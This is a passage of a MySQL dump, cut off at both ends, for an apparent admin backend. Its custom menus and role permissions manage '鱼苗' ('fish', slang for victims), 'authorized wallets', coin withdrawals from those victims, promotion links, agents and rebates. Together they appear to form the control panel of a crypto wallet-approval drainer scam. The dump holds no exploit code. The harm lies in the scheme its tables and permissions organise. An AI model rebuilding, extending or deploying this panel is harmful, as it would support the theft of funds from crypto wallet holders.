INSERT INTO `sys_menu` VALUES (1045, '日志导出', 501, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:logininfor:export', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1046, '在线查询', 109, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1047, '批量强退', 109, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:batchLogout', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1048, '单条强退', 109, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:online:forceLogout', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1049, '任务查询', 110, 1, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1050, '任务新增', 110, 2, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:add', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1051, '任务修改', 110, 3, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1052, '任务删除', 110, 4, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1053, '状态修改', 110, 5, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:changeStatus', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1054, '任务导出', 110, 7, '#', '', '', 1, 0, 'F', '0', '0', 'monitor:job:export', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1055, '生成查询', 115, 1, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:query', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1056, '生成修改', 115, 2, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:edit', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1057, '生成删除', 115, 3, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:remove', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1058, '导入代码', 115, 2, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:import', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1059, '预览代码', 115, 4, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:preview', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (1060, '生成代码', 115, 5, '#', '', '', 1, 0, 'F', '0', '0', 'tool:gen:code', '#', 'admin', '2022-02-27 01:06:23', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2000, '业务中心', 0, 1, 'type', NULL, NULL, 1, 0, 'M', '0', '0', '', '404', 'admin', '2022-03-05 00:26:12', 'admin', '2022-03-24 13:18:06', '');
INSERT INTO `sys_menu` VALUES (2001, '合约管理', 2000, 9, 'type', 'data/type/index', NULL, 1, 0, 'C', '0', '0', 'data:type:list', 'code', 'admin', '2022-03-05 00:31:42', 'admin', '2022-03-24 13:14:12', '链类型菜单');
INSERT INTO `sys_menu` VALUES (2002, '链类型查询', 2001, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:type:query', '#', 'admin', '2022-03-05 00:31:42', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2003, '链类型新增', 2001, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:type:add', '#', 'admin', '2022-03-05 00:31:42', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2004, '链类型修改', 2001, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:type:edit', '#', 'admin', '2022-03-05 00:31:42', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2005, '链类型删除', 2001, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:type:remove', '#', 'admin', '2022-03-05 00:31:42', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2006, '链类型导出', 2001, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:type:export', '#', 'admin', '2022-03-05 00:31:42', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2007, '鱼苗管理', 2000, 1, 'fish', 'data/fish/index', NULL, 1, 0, 'C', '0', '0', 'data:fish:list', 'people', 'admin', '2022-03-06 21:30:10', 'admin', '2022-03-24 13:14:00', '鱼苗菜单');
INSERT INTO `sys_menu` VALUES (2008, '鱼苗查询', 2007, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:fish:query', '#', 'admin', '2022-03-06 21:30:10', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2009, '鱼苗新增', 2007, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:fish:add', '#', 'admin', '2022-03-06 21:30:10', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2010, '鱼苗修改', 2007, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:fish:edit', '#', 'admin', '2022-03-06 21:30:10', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2011, '鱼苗删除', 2007, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:fish:remove', '#', 'admin', '2022-03-06 21:30:10', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2012, '鱼苗导出', 2007, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:fish:export', '#', 'admin', '2022-03-06 21:30:10', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2013, '授权钱包管理', 2000, 2, 'address', 'data/address/index', NULL, 1, 0, 'C', '0', '0', 'data:address:list', 'phone', 'admin', '2022-03-06 23:06:00', 'admin', '2022-03-24 13:09:51', '授权地址菜单');
INSERT INTO `sys_menu` VALUES (2014, '授权地址查询', 2013, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:address:query', '#', 'admin', '2022-03-06 23:06:00', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2015, '授权地址新增', 2013, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:address:add', '#', 'admin', '2022-03-06 23:06:00', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2016, '授权地址修改', 2013, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:address:edit', '#', 'admin', '2022-03-06 23:06:00', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2017, '授权地址删除', 2013, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:address:remove', '#', 'admin', '2022-03-06 23:06:00', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2018, '授权地址导出', 2013, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:address:export', '#', 'admin', '2022-03-06 23:06:00', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2019, '提币功能', 2007, 2, '', NULL, NULL, 1, 0, 'F', '0', '0', 'data:fish:draw', '#', 'admin', '2022-03-07 23:00:02', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2021, '提款记录', 2000, 5, 'transfer', 'data/transfer/index', NULL, 1, 0, 'C', '0', '0', 'data:transfer:list', 'log', 'admin', '2022-03-07 23:11:56', 'admin', '2022-03-24 13:14:47', '数据用户提现菜单');
INSERT INTO `sys_menu` VALUES (2022, '数据用户提现查询', 2021, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:transfer:query', '#', 'admin', '2022-03-07 23:11:56', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2023, '数据用户提现新增', 2021, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:transfer:add', '#', 'admin', '2022-03-07 23:11:56', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2024, '数据用户提现修改', 2021, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:transfer:edit', '#', 'admin', '2022-03-07 23:11:56', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2025, '数据用户提现删除', 2021, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:transfer:remove', '#', 'admin', '2022-03-07 23:11:56', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2026, '数据用户提现导出', 2021, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:transfer:export', '#', 'admin', '2022-03-07 23:11:56', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2027, '推广链接管理', 2000, 3, 'spread', 'data/spread/index', NULL, 1, 0, 'C', '0', '0', 'data:spread:list', 'international', 'admin', '2022-03-08 23:45:54', 'admin', '2022-03-24 13:12:31', '推广菜单');
INSERT INTO `sys_menu` VALUES (2028, '推广查询', 2027, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:spread:query', '#', 'admin', '2022-03-08 23:45:54', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2029, '推广新增', 2027, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:spread:add', '#', 'admin', '2022-03-08 23:45:54', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2030, '推广修改', 2027, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:spread:edit', '#', 'admin', '2022-03-08 23:45:54', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2031, '推广删除', 2027, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:spread:remove', '#', 'admin', '2022-03-08 23:45:54', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2032, '推广导出', 2027, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:spread:export', '#', 'admin', '2022-03-08 23:45:54', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2033, '展示代理人', 2021, 1, '', NULL, NULL, 1, 0, 'F', '0', '0', 'data:transfer:showagent', '#', 'admin', '2022-03-09 13:39:35', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2034, '显示代理人字段', 2007, 1, '', NULL, NULL, 1, 0, 'F', '0', '0', 'data:fish:showagent', '#', 'admin', '2022-03-09 22:07:09', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2035, '我的推广链接', 2000, 4, 'myqrcode', 'data/myqrcode/index', NULL, 1, 0, 'C', '0', '0', 'data:spread:list', 'guide', 'admin', '2022-03-09 22:11:59', 'admin', '2022-03-24 13:14:35', '');
INSERT INTO `sys_menu` VALUES (2036, '更新余额', 2007, 1, '', NULL, NULL, 1, 0, 'F', '0', '0', 'data:fish:updatabalance', '#', 'admin', '2022-03-11 21:31:51', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2037, '系统错误记录', 1, 1, 'errlog', 'data/errlog/index', NULL, 1, 0, 'C', '0', '0', 'data:errlog:list', 'bug', 'admin', '2022-03-24 04:51:37', 'admin', '2022-03-24 04:57:10', '系统错误记录菜单');
INSERT INTO `sys_menu` VALUES (2038, '系统错误记录查询', 2037, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:errlog:query', '#', 'admin', '2022-03-24 04:51:37', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2039, '系统错误记录新增', 2037, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:errlog:add', '#', 'admin', '2022-03-24 04:51:37', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2040, '系统错误记录修改', 2037, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:errlog:edit', '#', 'admin', '2022-03-24 04:51:37', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2041, '系统错误记录删除', 2037, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:errlog:remove', '#', 'admin', '2022-03-24 04:51:37', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2042, '系统错误记录导出', 2037, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:errlog:export', '#', 'admin', '2022-03-24 04:51:37', '', NULL, '');
INSERT INTO `sys_menu` VALUES (2049, '鱼苗返利', 2000, 1, 'rebate', 'data/rebate/index', NULL, 1, 0, 'C', '0', '0', 'data:rebate:list', 'time-range', 'admin', '2022-04-29 16:09:08', 'admin', '2022-05-12 20:55:07', '鱼苗返利历史菜单');
INSERT INTO `sys_menu` VALUES (2050, '鱼苗返利历史查询', 2049, 1, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:rebate:query', '#', 'admin', '2022-04-29 16:09:08', 'admin', '2022-05-12 20:55:17', '');
INSERT INTO `sys_menu` VALUES (2051, '鱼苗返利历史新增', 2049, 2, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:rebate:add', '#', 'admin', '2022-04-29 16:09:08', 'admin', '2022-05-12 20:55:27', '');
INSERT INTO `sys_menu` VALUES (2052, '鱼苗返利历史修改', 2049, 3, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:rebate:edit', '#', 'admin', '2022-04-29 16:09:08', 'admin', '2022-05-12 20:55:38', '');
INSERT INTO `sys_menu` VALUES (2053, '鱼苗返利历史删除', 2049, 4, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:rebate:remove', '#', 'admin', '2022-04-29 16:09:08', 'admin', '2022-05-12 20:55:47', '');
INSERT INTO `sys_menu` VALUES (2054, '鱼苗返利历史导出', 2049, 5, '#', '', NULL, 1, 0, 'F', '0', '0', 'data:rebate:export', '#', 'admin', '2022-04-29 16:09:08', 'admin', '2022-05-12 20:55:55', '');

-- ----------------------------
-- Table structure for sys_notice
-- ----------------------------
DROP TABLE IF EXISTS `sys_notice`;
CREATE TABLE `sys_notice`  (
  `notice_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '公告ID',
  `notice_title` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '公告标题',
  `notice_type` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '公告类型（1通知 2公告）',
  `notice_content` longblob NULL COMMENT '公告内容',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '公告状态（0正常 1关闭）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`notice_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '通知公告表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_notice
-- ----------------------------
INSERT INTO `sys_notice` VALUES (10, '温馨提醒：系统将在4月份要进行升级', '1', 0x3C703E3C7374726F6E67207374796C653D226261636B67726F756E642D636F6C6F723A2072676261283234352C203234372C203235302C20302E303136293B223EE6B8A9E9A6A8E68F90E98692EFBC9AE7B3BBE7BB9FE5B086E59CA834E69C88E4BBBDE8A681E8BF9BE8A18CE58D87E7BAA7E6B8A9E9A6A8E68F90E98692EFBC9AE7B3BB3C2F7374726F6E673E3C7370616E207374796C653D226261636B67726F756E642D636F6C6F723A2072676261283234352C203234372C203235302C20302E303136293B223EE7BB9F3C2F7370616E3E3C7370616E207374796C653D226261636B67726F756E642D636F6C6F723A20726762283235352C203135332C2030293B223EE5B086E59CA834E69C88E4BBBDE8A681E8BF9BE8A18CE58D87E7BAA7E6B8A9E9A6A8E68F90E98692EFBC9AE7B3BBE7BB9FE5B086E59CA83C2F7370616E3E3C7370616E207374796C653D226261636B67726F756E642D636F6C6F723A2072676261283234352C203234372C203235302C20302E303136293B223E34E69C88E4BBBDE8A681E8BF9BE8A18CE58D87E7BAA7E6B8A9E9A6A8E68F90E98692EFBC9AE7B3BBE7BB9FE5B086E59CA834E69C88E4BBBDE8A681E8BF9BE8A18CE58D87E7BAA73C2F7370616E3E3C2F703E, '0', 'admin', '2022-03-05 01:40:33', '', NULL, NULL);

-- ----------------------------
-- Table structure for sys_oper_log
-- ----------------------------
DROP TABLE IF EXISTS `sys_oper_log`;
CREATE TABLE `sys_oper_log`  (
  `oper_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '日志主键',
  `title` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '模块标题',
  `business_type` int(11) NULL DEFAULT 0 COMMENT '业务类型（0其它 1新增 2修改 3删除）',
  `method` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '方法名称',
  `request_method` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '请求方式',
  `operator_type` int(11) NULL DEFAULT 0 COMMENT '操作类别（0其它 1后台用户 2手机端用户）',
  `oper_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '操作人员',
  `dept_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '部门名称',
  `oper_url` varchar(2000) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '请求URL',
  `oper_ip` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '主机地址',
  `oper_location` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '操作地点',
  `oper_param` varchar(2000) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '请求参数',
  `json_result` varchar(2000) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '返回参数',
  `status` int(11) NULL DEFAULT 0 COMMENT '操作状态（0正常 1异常）',
  `error_msg` varchar(2000) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '错误消息',
  `oper_time` datetime(0) NULL DEFAULT NULL COMMENT '操作时间',
  PRIMARY KEY (`oper_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '操作日志记录' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_oper_log
-- ----------------------------

-- ----------------------------
-- Table structure for sys_post
-- ----------------------------
DROP TABLE IF EXISTS `sys_post`;
CREATE TABLE `sys_post`  (
  `post_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '岗位ID',
  `post_code` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '岗位编码',
  `post_name` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '岗位名称',
  `post_sort` int(11) NOT NULL COMMENT '显示顺序',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`post_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '岗位信息表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_post
-- ----------------------------
INSERT INTO `sys_post` VALUES (1, 'ceo', '董事长', 1, '0', 'admin', '2022-02-27 01:06:22', '', NULL, '');
INSERT INTO `sys_post` VALUES (4, 'user', '代理', 4, '0', 'admin', '2022-02-27 01:06:22', 'admin', '2022-03-24 13:04:39', '');

-- ----------------------------
-- Table structure for sys_role
-- ----------------------------
DROP TABLE IF EXISTS `sys_role`;
CREATE TABLE `sys_role`  (
  `role_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '角色ID',
  `role_name` varchar(30) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '角色名称',
  `role_key` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '角色权限字符串',
  `role_sort` int(11) NOT NULL COMMENT '显示顺序',
  `data_scope` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '1' COMMENT '数据范围（1：全部数据权限 2：自定数据权限 3：本部门数据权限 4：本部门及以下数据权限）',
  `menu_check_strictly` tinyint(1) NULL DEFAULT 1 COMMENT '菜单树选择项是否关联显示',
  `dept_check_strictly` tinyint(1) NULL DEFAULT 1 COMMENT '部门树选择项是否关联显示',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '角色状态（0正常 1停用）',
  `del_flag` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `create_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '创建者',
  `create_time` datetime(0) NULL DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '更新者',
  `update_time` datetime(0) NULL DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`role_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 102 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '角色信息表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_role
-- ----------------------------
INSERT INTO `sys_role` VALUES (1, '超级管理员', 'admin', 1, '1', 1, 1, '0', '0', 'admin', '2022-02-27 01:06:23', '', NULL, '超级管理员');
INSERT INTO `sys_role` VALUES (2, '普通角色', 'common', 2, '4', 1, 1, '0', '0', 'admin', '2022-02-27 01:06:23', 'admin', '2022-03-16 21:47:45', '普通角色');
INSERT INTO `sys_role` VALUES (100, '董事长', 'deptadmin', 3, '4', 1, 1, '0', '0', 'admin', '2022-03-20 15:18:22', 'admin', '2022-09-06 08:55:25', NULL);
INSERT INTO `sys_role` VALUES (101, '代理', 'agent', 4, '5', 1, 1, '0', '0', 'admin', '2022-03-20 15:19:25', 'admin', '2022-06-02 01:36:29', NULL);

-- ----------------------------
-- Table structure for sys_role_dept
-- ----------------------------
DROP TABLE IF EXISTS `sys_role_dept`;
CREATE TABLE `sys_role_dept`  (
  `role_id` bigint(20) NOT NULL COMMENT '角色ID',
  `dept_id` bigint(20) NOT NULL COMMENT '部门ID',
  PRIMARY KEY (`role_id`, `dept_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '角色和部门关联表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_role_dept
-- ----------------------------

-- ----------------------------
-- Table structure for sys_role_menu
-- ----------------------------
DROP TABLE IF EXISTS `sys_role_menu`;
CREATE TABLE `sys_role_menu`  (
  `role_id` bigint(20) NOT NULL COMMENT '角色ID',
  `menu_id` bigint(20) NOT NULL COMMENT '菜单ID',
  PRIMARY KEY (`role_id`, `menu_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_520_ci COMMENT = '角色和菜单关联表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of sys_role_menu
-- ----------------------------
INSERT INTO `sys_role_menu` VALUES (2, 1);
INSERT INTO `sys_role_menu` VALUES (2, 107);
INSERT INTO `sys_role_menu` VALUES (2, 1036);
INSERT INTO `sys_role_menu` VALUES (2, 2000);
INSERT INTO `sys_role_menu` VALUES (2, 2007);
INSERT INTO `sys_role_menu` VALUES (2, 2008);
INSERT INTO `sys_role_menu` VALUES (2, 2012);
INSERT INTO `sys_role_menu` VALUES (2, 2019);
INSERT INTO `sys_role_menu` VALUES (2, 2021);
INSERT INTO `sys_role_menu` VALUES (2, 2022);
INSERT INTO `sys_role_menu` VALUES (2, 2026);
INSERT INTO `sys_role_menu` VALUES (2, 2035);
INSERT INTO `sys_role_menu` VALUES (2, 2036);
INSERT INTO `sys_role_menu` VALUES (100, 2000);
INSERT INTO `sys_role_menu` VALUES (100, 2007);
INSERT INTO `sys_role_menu` VALUES (100, 2008);
INSERT INTO `sys_role_menu` VALUES (100, 2009);
INSERT INTO `sys_role_menu` VALUES (100, 2010);
INSERT INTO `sys_role_menu` VALUES (100, 2011);
INSERT INTO `sys_role_menu` VALUES (100, 2012);
INSERT INTO `sys_role_menu` VALUES (100, 2013);
INSERT INTO `sys_role_menu` VALUES (100, 2014);
INSERT INTO `sys_role_menu` VALUES (100, 2015);
INSERT INTO `sys_role_menu` VALUES (100, 2016);
INSERT INTO `sys_role_menu` VALUES (100, 2017);
INSERT INTO `sys_role_menu` VALUES (100, 2018);
INSERT INTO `sys_role_menu` VALUES (100, 2019);
INSERT INTO `sys_role_menu` VALUES (100, 2021);
INSERT INTO `sys_role_menu` VALUES (100, 2022);
INSERT INTO `sys_role_menu` VALUES (100, 2023);
INSERT INTO `sys_role_menu` VALUES (100, 2024);
INSERT INTO `sys_role_menu` VALUES (100, 2025);
INSERT INTO `sys_role_menu` VALUES (100, 2026);
INSERT INTO `sys_role_menu` VALUES (100, 2027);
INSERT INTO `sys_role_menu` VALUES (100, 2028);
INSERT INTO `sys_role_menu` VALUES (100, 2029);
INSERT INTO `sys_role_menu` VALUES (100, 2030);
INSERT INTO `sys_role_menu` VALUES (100, 2031);
INSERT INTO `sys_role_menu` VALUES (100, 2032);
INSERT INTO `sys_role_menu` VALUES (100, 2033);
INSERT INTO `sys_role_menu` VALUES (100, 2034);
INSERT INTO `sys_role_menu` VALUES (100, 2035);
INSERT INTO `sys_role_menu` VALUES (100, 2036);
INSERT INTO `sys_role_menu` VALUES (100, 2049);
INSERT INTO `sys_role_menu` VALUES (100, 2050);
INSERT INTO `sys_role_menu` VALUES (100, 2051);
INSERT INTO `sys_role_menu` VALUES (100, 2052);
INSERT INTO `sys_role_menu` VALUES (100, 2053);
INSERT INTO `sys_role_menu` VALUES (100, 2054);
INSERT INTO `sys_role_menu` VALUES (101, 2000);
INSERT INTO `sys_role_menu` VALUES (101, 2007);
INSERT INTO `sys_role_menu` VALUES (101, 2008);
INSERT INTO `sys_role_menu` VALUES (101, 2009);
INSERT INTO `sys_role_menu` VALUES (101, 2010);
INSERT INTO `sys_role_menu` VALUES (101, 2011);
INSERT INTO `sys_role_menu` VALUES (101, 2012);
INSERT INTO `sys_role_menu` VALUES (101, 2021);
INSERT INTO `sys_role_menu` VALUES (101, 2022);
INSERT INTO `sys_role_menu` VALUES (101, 2035);
INSERT INTO `sys_role_menu` VALUES (101, 2036);

-- ----------------------------
-- Table structure for sys_user
-- ----------------------------
DROP TABLE IF EXISTS `sys_user`;
CREATE TABLE `sys_user`  (
  `user_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '用户ID',
  `dept_id` bigint(20) NULL DEFAULT NULL COMMENT '部门ID',
  `user_name` varchar(30) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '用户账号',
  `nick_name` varchar(30) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NOT NULL COMMENT '用户昵称',
  `user_type` varchar(2) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '00' COMMENT '用户类型（00系统用户）',
  `email` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '用户邮箱',
  `phonenumber` varchar(11) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '手机号码',
  `sex` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '用户性别（0男 1女 2未知）',
  `avatar` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '头像地址',
  `password` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '' COMMENT '密码',
  `status` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_520_ci NULL DEFAULT '0' COMMENT '帐号状态（0正常 1停用）',
